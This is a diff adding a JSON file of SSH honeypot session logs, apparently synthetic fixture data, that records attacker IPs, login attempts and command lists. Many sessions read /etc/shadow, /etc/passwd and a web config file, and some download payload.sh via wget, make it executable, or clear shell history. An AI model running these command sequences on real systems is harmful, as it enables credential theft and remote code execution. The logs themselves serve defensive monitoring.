@@ -1,0 +1,875 @@
+[
+  {
+    "@timestamp": "2026-07-04T09:01:10.108168Z",
+    "session_id": "a4c662cd",
+    "attacker_ip": "172.18.0.5",
+    "service": "ssh",
+    "session_duration": 67.72,
+    "login_attempts": 3,
+    "login_success": true,
+    "commands": [
+      "uname -r",
+      "cat /etc/os-release",
+      "crontab -l",
+      "netstat -tlpn",
+      "ps aux",
+      "cat /etc/passwd",
+      "ls -la /home/admin",
+      "history -c"
+    ],
+    "command_count": 8,
+    "unique_commands": 8,
+    "files_downloaded": [],
+    "file_hashes": [],
+    "brute_force_detected": true,
+    "ttp_count": 4,
+    "session_active": false,
+    "last_event_type": "cowrie.session.closed",
+    "usernames_tried": [
+      "admin",
+      "root"
+    ],
+    "session_start": "2026-07-04T09:00:00Z",
+    "session_end": "2026-07-04T09:01:10.108168Z"
+  },
+  {
+    "@timestamp": "2026-07-04T09:01:48.677016Z",
+    "session_id": "90e6b5d0",
+    "attacker_ip": "172.18.0.5",
+    "service": "ssh",
+    "session_duration": 28.8,
+    "login_attempts": 3,
+    "login_success": true,
+    "commands": [
+      "id",
+      "whoami",
+      "uname -a",
+      "cat /etc/issue",
+      "cat /etc/passwd",
+      "cat /etc/shadow",
+      "ls -la /var/www",
+      "cat /var/www/html/config.php"
+    ],
+    "command_count": 8,
+    "unique_commands": 8,
+    "files_downloaded": [],
+    "file_hashes": [],
+    "brute_force_detected": true,
+    "ttp_count": 3,
+    "session_active": false,
+    "last_event_type": "cowrie.session.closed",
+    "usernames_tried": [
+      "root",
+      "admin",
+      "cloudsync"
+    ],
+    "session_start": "2026-07-04T09:01:10.108168Z",
+    "session_end": "2026-07-04T09:01:48.677016Z"
+  },
+  {
+    "@timestamp": "2026-07-04T09:02:22.680474Z",
+    "session_id": "2202d125",
+    "attacker_ip": "172.18.0.15",
+    "service": "ssh",
+    "session_duration": 28.23,
+    "login_attempts": 1,
+    "login_success": true,
+    "commands": [
+      "id",
+      "whoami",
+      "uname -a",
+      "cat /etc/issue",
+      "cat /etc/passwd",
+      "cat /etc/shadow",
+      "ls -la /var/www",
+      "cat /var/www/html/config.php"
+    ],
+    "command_count": 8,
+    "unique_commands": 8,
+    "files_downloaded": [],
+    "file_hashes": [],
+    "brute_force_detected": false,
+    "ttp_count": 2,
+    "session_active": false,
+    "last_event_type": "cowrie.session.closed",
+    "usernames_tried": [
+      "root"
+    ],
+    "session_start": "2026-07-04T09:01:48.677016Z",
+    "session_end": "2026-07-04T09:02:22.680474Z"
+  },
+  {
+    "@timestamp": "2026-07-04T09:02:55.024792Z",
+    "session_id": "637696b2",
+    "attacker_ip": "172.18.0.5",
+    "service": "ssh",
+    "session_duration": 27.91,
+    "login_attempts": 4,
+    "login_success": true,
+    "commands": [
+      "id",
+      "whoami",
+      "uname -a",
+      "cat /etc/issue",
+      "cat /etc/passwd",
+      "cat /etc/shadow",
+      "ls -la /var/www",
+      "cat /var/www/html/config.php",
+      "wget http://172.18.0.5:8000/payload.sh",
+      "chmod +x payload.sh"
+    ],
+    "command_count": 10,
+    "unique_commands": 10,
+    "files_downloaded": [
+      "payload.sh"
+    ],
+    "file_hashes": [
+      "b586acf6731adb92dac8b9e28a3a32e0"
+    ],
+    "brute_force_detected": true,
+    "ttp_count": 3,
+    "session_active": false,
+    "last_event_type": "cowrie.session.closed",
+    "usernames_tried": [
+      "root",
+      "admin",
+      "cloudsync"
+    ],
+    "session_start": "2026-07-04T09:02:22.680474Z",
+    "session_end": "2026-07-04T09:02:55.024792Z"
+  },
+  {
+    "@timestamp": "2026-07-04T09:03:50.041935Z",
+    "session_id": "2c5d552b",
+    "attacker_ip": "172.18.0.25",
+    "service": "ssh",
+    "session_duration": 49.86,
+    "login_attempts": 3,
+    "login_success": true,
+    "commands": [
+      "uname -r",
+      "cat /etc/os-release",
+      "crontab -l",
+      "netstat -tlpn",
+      "ps aux",
+      "cat /etc/passwd",
+      "ls -la /home/admin",
+      "history -c"
+    ],
+    "command_count": 8,
+    "unique_commands": 8,
+    "files_downloaded": [],
+    "file_hashes": [],
+    "brute_force_detected": true,
+    "ttp_count": 4,
+    "session_active": false,
+    "last_event_type": "cowrie.session.closed",
+    "usernames_tried": [
+      "admin",
+      "root"
+    ],
+    "session_start": "2026-07-04T09:02:55.024792Z",
+    "session_end": "2026-07-04T09:03:50.041935Z"
+  },
+  {
+    "@timestamp": "2026-07-04T09:04:26.195535Z",
+    "session_id": "71186299",
+    "attacker_ip": "172.18.0.5",
+    "service": "ssh",
+    "session_duration": 32.42,
+    "login_attempts": 4,
+    "login_success": true,
+    "commands": [
+      "id",
+      "whoami",
+      "uname -a",
+      "cat /etc/issue",
+      "cat /etc/passwd",
+      "cat /etc/shadow",
+      "ls -la /var/www",
+      "cat /var/www/html/config.php",
+      "wget http://172.18.0.5:8000/payload.sh",
+      "chmod +x payload.sh"
+    ],
+    "command_count": 10,
+    "unique_commands": 10,
+    "files_downloaded": [
+      "payload.sh"
+    ],
+    "file_hashes": [
+      "0252f8cc150873a7f21380b6df8abea5"
+    ],
+    "brute_force_detected": true,
+    "ttp_count": 3,
+    "session_active": false,
+    "last_event_type": "cowrie.session.closed",
+    "usernames_tried": [
+      "root",
+      "admin",
+      "cloudsync"
+    ],
+    "session_start": "2026-07-04T09:03:50.041935Z",
+    "session_end": "2026-07-04T09:04:26.195535Z"
+  },
+  {
+    "@timestamp": "2026-07-04T09:05:31.432058Z",
+    "session_id": "283e3ff6",
+    "attacker_ip": "172.18.0.15",
+    "service": "ssh",
+    "session_duration": 61.14,
+    "login_attempts": 2,
+    "login_success": true,
+    "commands": [
+      "uname -r",
+      "cat /etc/os-release",
+      "crontab -l",
+      "netstat -tlpn",
+      "ps aux",
+      "cat /etc/passwd",
+      "ls -la /home/admin",
+      "history -c"
+    ],
+    "command_count": 8,
+    "unique_commands": 8,
+    "files_downloaded": [],
+    "file_hashes": [],
+    "brute_force_detected": false,
+    "ttp_count": 3,
+    "session_active": false,
+    "last_event_type": "cowrie.session.closed",
+    "usernames_tried": [
+      "admin",
+      "root"
+    ],
+    "session_start": "2026-07-04T09:04:26.195535Z",
+    "session_end": "2026-07-04T09:05:31.432058Z"
+  },
+  {
+    "@timestamp": "2026-07-04T09:06:24.970915Z",
+    "session_id": "e1c2ea40",
+    "attacker_ip": "172.18.0.5",
+    "service": "ssh",
+    "session_duration": 45.43,
+    "login_attempts": 2,
+    "login_success": true,
+    "commands": [
+      "uname -r",
+      "cat /etc/os-release",
+      "crontab -l",
+      "netstat -tlpn",
+      "ps aux",
+      "cat /etc/passwd",
+      "ls -la /home/admin",
+      "history -c"
+    ],
+    "command_count": 8,
+    "unique_commands": 8,
+    "files_downloaded": [],
+    "file_hashes": [],
+    "brute_force_detected": false,
+    "ttp_count": 3,
+    "session_active": false,
+    "last_event_type": "cowrie.session.closed",
+    "usernames_tried": [
+      "admin",
+      "root"
+    ],
+    "session_start": "2026-07-04T09:05:31.432058Z",
+    "session_end": "2026-07-04T09:06:24.970915Z"
+  },
+  {
+    "@timestamp": "2026-07-04T09:07:37.661988Z",
+    "session_id": "7798c279",
+    "attacker_ip": "172.18.0.25",
+    "service": "ssh",
+    "session_duration": 66.89,
+    "login_attempts": 2,
+    "login_success": true,
+    "commands": [
+      "uname -r",
+      "cat /etc/os-release",
+      "crontab -l",
+      "netstat -tlpn",
+      "ps aux",
+      "cat /etc/passwd",
+      "ls -la /home/admin",
+      "history -c"
+    ],
+    "command_count": 8,
+    "unique_commands": 8,
+    "files_downloaded": [],
+    "file_hashes": [],
+    "brute_force_detected": false,
+    "ttp_count": 5,
+    "session_active": false,
+    "last_event_type": "cowrie.session.closed",
+    "usernames_tried": [
+      "admin",
+      "root"
+    ],
+    "session_start": "2026-07-04T09:06:24.970915Z",
+    "session_end": "2026-07-04T09:07:37.661988Z"
+  },
+  {
+    "@timestamp": "2026-07-04T09:08:18.971441Z",
+    "session_id": "8f9a8800",
+    "attacker_ip": "172.18.0.25",
+    "service": "ssh",
+    "session_duration": 31.68,
+    "login_attempts": 2,
+    "login_success": true,
+    "commands": [
+      "id",
+      "whoami",
+      "uname -a",
+      "cat /etc/issue",
+      "cat /etc/passwd",
+      "cat /etc/shadow",
+      "ls -la /var/www",
+      "cat /var/www/html/config.php"
+    ],
+    "command_count": 8,
+    "unique_commands": 8,
+    "files_downloaded": [],
+    "file_hashes": [],
+    "brute_force_detected": false,
+    "ttp_count": 2,
+    "session_active": false,
+    "last_event_type": "cowrie.session.closed",
+    "usernames_tried": [
+      "root",
+      "admin"
+    ],
+    "session_start": "2026-07-04T09:07:37.661988Z",
+    "session_end": "2026-07-04T09:08:18.971441Z"
+  },
+  {
+    "@timestamp": "2026-07-04T09:08:59.590412Z",
+    "session_id": "20e20075",
+    "attacker_ip": "172.18.0.5",
+    "service": "ssh",
+    "session_duration": 33.74,
+    "login_attempts": 4,
+    "login_success": true,
+    "commands": [
+      "id",
+      "whoami",
+      "uname -a",
+      "cat /etc/issue",
+      "cat /etc/passwd",
+      "cat /etc/shadow",
+      "ls -la /var/www",
+      "cat /var/www/html/config.php",
+      "wget http://172.18.0.5:8000/payload.sh",
+      "chmod +x payload.sh"
+    ],
+    "command_count": 10,
+    "unique_commands": 10,
+    "files_downloaded": [
+      "payload.sh"
+    ],
+    "file_hashes": [
+      "34b60b3ce2175efcfcfea899bb537df3"
+    ],
+    "brute_force_detected": true,
+    "ttp_count": 4,
+    "session_active": false,
+    "last_event_type": "cowrie.session.closed",
+    "usernames_tried": [
+      "root",
+      "admin",
+      "cloudsync"
+    ],
+    "session_start": "2026-07-04T09:08:18.971441Z",
+    "session_end": "2026-07-04T09:08:59.590412Z"
+  },
+  {
+    "@timestamp": "2026-07-04T09:10:08.066145Z",
+    "session_id": "aafe43ed",
+    "attacker_ip": "172.18.0.15",
+    "service": "ssh",
+    "session_duration": 60.57,
+    "login_attempts": 1,
+    "login_success": true,
+    "commands": [
+      "uname -r",
+      "cat /etc/os-release",
+      "crontab -l",
+      "netstat -tlpn",
+      "ps aux",
+      "cat /etc/passwd",
+      "ls -la /home/admin",
+      "history -c"
+    ],
+    "command_count": 8,
+    "unique_commands": 8,
+    "files_downloaded": [],
+    "file_hashes": [],
+    "brute_force_detected": false,
+    "ttp_count": 3,
+    "session_active": false,
+    "last_event_type": "cowrie.session.closed",
+    "usernames_tried": [
+      "admin"
+    ],
+    "session_start": "2026-07-04T09:08:59.590412Z",
+    "session_end": "2026-07-04T09:10:08.066145Z"
+  },
+  {
+    "@timestamp": "2026-07-04T09:10:35.906598Z",
+    "session_id": "f477909f",
+    "attacker_ip": "172.18.0.25",
+    "service": "ssh",
+    "session_duration": 23.14,
+    "login_attempts": 2,
+    "login_success": true,
+    "commands": [
+      "id",
+      "whoami",
+      "uname -a",
+      "cat /etc/issue",
+      "cat /etc/passwd",
+      "cat /etc/shadow",
+      "ls -la /var/www",
+      "cat /var/www/html/config.php",
+      "wget http://172.18.0.5:8000/payload.sh",
+      "chmod +x payload.sh"
+    ],
+    "command_count": 10,
+    "unique_commands": 10,
+    "files_downloaded": [
+      "payload.sh"
+    ],
+    "file_hashes": [
+      "bf1f64f966a860cdade3d0a5ecbdca54"
+    ],
+    "brute_force_detected": false,
+    "ttp_count": 3,
+    "session_active": false,
+    "last_event_type": "cowrie.session.closed",
+    "usernames_tried": [
+      "root",
+      "admin"
+    ],
+    "session_start": "2026-07-04T09:10:08.066145Z",
+    "session_end": "2026-07-04T09:10:35.906598Z"
+  },
+  {
+    "@timestamp": "2026-07-04T09:11:12.982611Z",
+    "session_id": "214b229f",
+    "attacker_ip": "172.18.0.5",
+    "service": "ssh",
+    "session_duration": 28.48,
+    "login_attempts": 3,
+    "login_success": true,
+    "commands": [
+      "id",
+      "whoami",
+      "uname -a",
+      "cat /etc/issue",
+      "cat /etc/passwd",
+      "cat /etc/shadow",
+      "ls -la /var/www",
+      "cat /var/www/html/config.php",
+      "wget http://172.18.0.5:8000/payload.sh",
+      "chmod +x payload.sh"
+    ],
+    "command_count": 10,
+    "unique_commands": 10,
+    "files_downloaded": [
+      "payload.sh"
+    ],
+    "file_hashes": [
+      "22229a402081bab761dfe186efae9f3f"
+    ],
+    "brute_force_detected": true,
+    "ttp_count": 4,
+    "session_active": false,
+    "last_event_type": "cowrie.session.closed",
+    "usernames_tried": [
+      "root",
+      "admin",
+      "cloudsync"
+    ],
+    "session_start": "2026-07-04T09:10:35.906598Z",
+    "session_end": "2026-07-04T09:11:12.982611Z"
+  },
+  {
+    "@timestamp": "2026-07-04T09:12:09.860152Z",
+    "session_id": "273376b2",
+    "attacker_ip": "172.18.0.15",
+    "service": "ssh",
+    "session_duration": 53.98,
+    "login_attempts": 2,
+    "login_success": true,
+    "commands": [
+      "uname -r",
+      "cat /etc/os-release",
+      "crontab -l",
+      "netstat -tlpn",
+      "ps aux",
+      "cat /etc/passwd",
+      "ls -la /home/admin",
+      "history -c"
+    ],
+    "command_count": 8,
+    "unique_commands": 8,
+    "files_downloaded": [],
+    "file_hashes": [],
+    "brute_force_detected": false,
+    "ttp_count": 4,
+    "session_active": false,
+    "last_event_type": "cowrie.session.closed",
+    "usernames_tried": [
+      "admin",
+      "root"
+    ],
+    "session_start": "2026-07-04T09:11:12.982611Z",
+    "session_end": "2026-07-04T09:12:09.860152Z"
+  },
+  {
+    "@timestamp": "2026-07-04T09:12:43.123308Z",
+    "session_id": "dcddcc64",
+    "attacker_ip": "172.18.0.15",
+    "service": "ssh",
+    "session_duration": 31.15,
+    "login_attempts": 3,
+    "login_success": true,
+    "commands": [
+      "id",
+      "whoami",
+      "uname -a",
+      "cat /etc/issue",
+      "cat /etc/passwd",
+      "cat /etc/shadow",
+      "ls -la /var/www",
+      "cat /var/www/html/config.php"
+    ],
+    "command_count": 8,
+    "unique_commands": 8,
+    "files_downloaded": [],
+    "file_hashes": [],
+    "brute_force_detected": true,
+    "ttp_count": 2,
+    "session_active": false,
+    "last_event_type": "cowrie.session.closed",
+    "usernames_tried": [
+      "root",
+      "admin",
+      "cloudsync"
+    ],
+    "session_start": "2026-07-04T09:12:09.860152Z",
+    "session_end": "2026-07-04T09:12:43.123308Z"
+  },
+  {
+    "@timestamp": "2026-07-04T09:13:22.153356Z",
+    "session_id": "753e6f8a",
+    "attacker_ip": "172.18.0.25",
+    "service": "ssh",
+    "session_duration": 33.26,
+    "login_attempts": 1,
+    "login_success": true,
+    "commands": [
+      "id",
+      "whoami",
+      "uname -a",
+      "cat /etc/issue",
+      "cat /etc/passwd",
+      "cat /etc/shadow",
+      "ls -la /var/www",
+      "cat /var/www/html/config.php",
+      "wget http://172.18.0.5:8000/payload.sh",
+      "chmod +x payload.sh"
+    ],
+    "command_count": 10,
+    "unique_commands": 10,
+    "files_downloaded": [
+      "payload.sh"
+    ],
+    "file_hashes": [
+      "c46f0035509adf1e7e0830c15715d8a3"
+    ],
+    "brute_force_detected": false,
+    "ttp_count": 3,
+    "session_active": false,
+    "last_event_type": "cowrie.session.closed",
+    "usernames_tried": [
+      "root"
+    ],
+    "session_start": "2026-07-04T09:12:43.123308Z",
+    "session_end": "2026-07-04T09:13:22.153356Z"
+  },
+  {
+    "@timestamp": "2026-07-04T09:13:53.597711Z",
+    "session_id": "421e2d90",
+    "attacker_ip": "172.18.0.25",
+    "service": "ssh",
+    "session_duration": 26.68,
+    "login_attempts": 3,
+    "login_success": true,
+    "commands": [
+      "id",
+      "whoami",
+      "uname -a",
+      "cat /etc/issue",
+      "cat /etc/passwd",
+      "cat /etc/shadow",
+      "ls -la /var/www",
+      "cat /var/www/html/config.php"
+    ],
+    "command_count": 8,
+    "unique_commands": 8,
+    "files_downloaded": [],
+    "file_hashes": [],
+    "brute_force_detected": true,
+    "ttp_count": 3,
+    "session_active": false,
+    "last_event_type": "cowrie.session.closed",
+    "usernames_tried": [
+      "root",
+      "admin",
+      "cloudsync"
+    ],
+    "session_start": "2026-07-04T09:13:22.153356Z",
+    "session_end": "2026-07-04T09:13:53.597711Z"
+  },
+  {
+    "@timestamp": "2026-07-04T09:14:29.212720Z",
+    "session_id": "6d45704e",
+    "attacker_ip": "172.18.0.15",
+    "service": "ssh",
+    "session_duration": 32.43,
+    "login_attempts": 1,
+    "login_success": true,
+    "commands": [
+      "id",
+      "whoami",
+      "uname -a",
+      "cat /etc/issue",
+      "cat /etc/passwd",
+      "cat /etc/shadow",
+      "ls -la /var/www",
+      "cat /var/www/html/config.php"
+    ],
+    "command_count": 8,
+    "unique_commands": 8,
+    "files_downloaded": [],
+    "file_hashes": [],
+    "brute_force_detected": false,
+    "ttp_count": 2,
+    "session_active": false,
+    "last_event_type": "cowrie.session.closed",
+    "usernames_tried": [
+      "root"
+    ],
+    "session_start": "2026-07-04T09:13:53.597711Z",
+    "session_end": "2026-07-04T09:14:29.212720Z"
+  },
+  {
+    "@timestamp": "2026-07-04T09:14:58.956335Z",
+    "session_id": "2ed57d76",
+    "attacker_ip": "172.18.0.5",
+    "service": "ssh",
+    "session_duration": 22.33,
+    "login_attempts": 3,
+    "login_success": true,
+    "commands": [
+      "id",
+      "whoami",
+      "uname -a",
+      "cat /etc/issue",
+      "cat /etc/passwd",
+      "cat /etc/shadow",
+      "ls -la /var/www",
+      "cat /var/www/html/config.php"
+    ],
+    "command_count": 8,
+    "unique_commands": 8,
+    "files_downloaded": [],
+    "file_hashes": [],
+    "brute_force_detected": true,
+    "ttp_count": 2,
+    "session_active": false,
+    "last_event_type": "cowrie.session.closed",
+    "usernames_tried": [
+      "root",
+      "admin",
+      "cloudsync"
+    ],
+    "session_start": "2026-07-04T09:14:29.212720Z",
+    "session_end": "2026-07-04T09:14:58.956335Z"
+  },
+  {
+    "@timestamp": "2026-07-04T09:15:27.147990Z",
+    "session_id": "bfef2ab6",
+    "attacker_ip": "172.18.0.15",
+    "service": "ssh",
+    "session_duration": 23.79,
+    "login_attempts": 2,
+    "login_success": true,
+    "commands": [
+      "id",
+      "whoami",
+      "uname -a",
+      "cat /etc/issue",
+      "cat /etc/passwd",
+      "cat /etc/shadow",
+      "ls -la /var/www",
+      "cat /var/www/html/config.php"
+    ],
+    "command_count": 8,
+    "unique_commands": 8,
+    "files_downloaded": [],
+    "file_hashes": [],
+    "brute_force_detected": false,
+    "ttp_count": 3,
+    "session_active": false,
+    "last_event_type": "cowrie.session.closed",
+    "usernames_tried": [
+      "root",
+      "admin"
+    ],
+    "session_start": "2026-07-04T09:14:58.956335Z",
+    "session_end": "2026-07-04T09:15:27.147990Z"
+  },
+  {
+    "@timestamp": "2026-07-04T09:15:55.966609Z",
+    "session_id": "5d165d76",
+    "attacker_ip": "172.18.0.25",
+    "service": "ssh",
+    "session_duration": 24.85,
+    "login_attempts": 4,
+    "login_success": true,
+    "commands": [
+      "id",
+      "whoami",
+      "uname -a",
+      "cat /etc/issue",
+      "cat /etc/passwd",
+      "cat /etc/shadow",
+      "ls -la /var/www",
+      "cat /var/www/html/config.php"
+    ],
+    "command_count": 8,
+    "unique_commands": 8,
+    "files_downloaded": [],
+    "file_hashes": [],
+    "brute_force_detected": true,
+    "ttp_count": 2,
+    "session_active": false,
+    "last_event_type": "cowrie.session.closed",
+    "usernames_tried": [
+      "root",
+      "admin",
+      "cloudsync"
+    ],
+    "session_start": "2026-07-04T09:15:27.147990Z",
+    "session_end": "2026-07-04T09:15:55.966609Z"
+  },
+  {
+    "@timestamp": "2026-07-04T09:16:31.789657Z",
+    "session_id": "a402e836",
+    "attacker_ip": "172.18.0.15",
+    "service": "ssh",
+    "session_duration": 28.14,
+    "login_attempts": 4,
+    "login_success": true,
+    "commands": [
+      "id",
+      "whoami",
+      "uname -a",
+      "cat /etc/issue",
+      "cat /etc/passwd",
+      "cat /etc/shadow",
+      "ls -la /var/www",
+      "cat /var/www/html/config.php",
+      "wget http://172.18.0.5:8000/payload.sh",
+      "chmod +x payload.sh"
+    ],
+    "command_count": 10,
+    "unique_commands": 10,
+    "files_downloaded": [
+      "payload.sh"
+    ],
+    "file_hashes": [
+      "c77d55eebf4ac3f28802fd0537afd77a"
+    ],
+    "brute_force_detected": true,
+    "ttp_count": 4,
+    "session_active": false,
+    "last_event_type": "cowrie.session.closed",
+    "usernames_tried": [
+      "root",
+      "admin",
+      "cloudsync"
+    ],
+    "session_start": "2026-07-04T09:15:55.966609Z",
+    "session_end": "2026-07-04T09:16:31.789657Z"
+  },
+  {
+    "@timestamp": "2026-07-04T09:17:41.555594Z",
+    "session_id": "189feae1",
+    "attacker_ip": "172.18.0.15",
+    "service": "ssh",
+    "session_duration": 67.66,
+    "login_attempts": 3,
+    "login_success": true,
+    "commands": [
+      "uname -r",
+      "cat /etc/os-release",
+      "crontab -l",
+      "netstat -tlpn",
+      "ps aux",
+      "cat /etc/passwd",
+      "ls -la /home/admin",
+      "history -c"
+    ],
+    "command_count": 8,
+    "unique_commands": 8,
+    "files_downloaded": [],
+    "file_hashes": [],
+    "brute_force_detected": true,
+    "ttp_count": 3,
+    "session_active": false,
+    "last_event_type": "cowrie.session.closed",
+    "usernames_tried": [
+      "admin",
+      "root"
+    ],
+    "session_start": "2026-07-04T09:16:31.789657Z",
+    "session_end": "2026-07-04T09:17:41.555594Z"
+  },
+  {
+    "@timestamp": "2026-07-04T09:18:12.868247Z",
+    "session_id": "fd6dc367",
+    "attacker_ip": "172.18.0.15",
+    "service": "ssh",
+    "session_duration": 28.82,
+    "login_attempts": 2,
+    "login_success": true,
+    "commands": [
+      "id",
+      "whoami",
+      "uname -a",
+      "cat /etc/issue",
+      "cat /etc/passwd",
+      "cat /etc/shadow",
+      "ls -la /var/www",
+      "cat /var/www/html/config.php"
+    ],
+    "command_count": 8,
+    "unique_commands": 8,
+    "files_downloaded": [],
+    "file_hashes": [],
+    "brute_force_detected": false,
+    "ttp_count": 4,
+    "session_active": false,
+    "last_event_type": "cowrie.session.closed",
+    "usernames_tried": [
+      "root",
+      "admin"
+    ],
+    "session_start": "2026-07-04T09:17:41.555594Z",
+    "session_end": "2026-07-04T09:18:12.868247Z"
+  }
+]
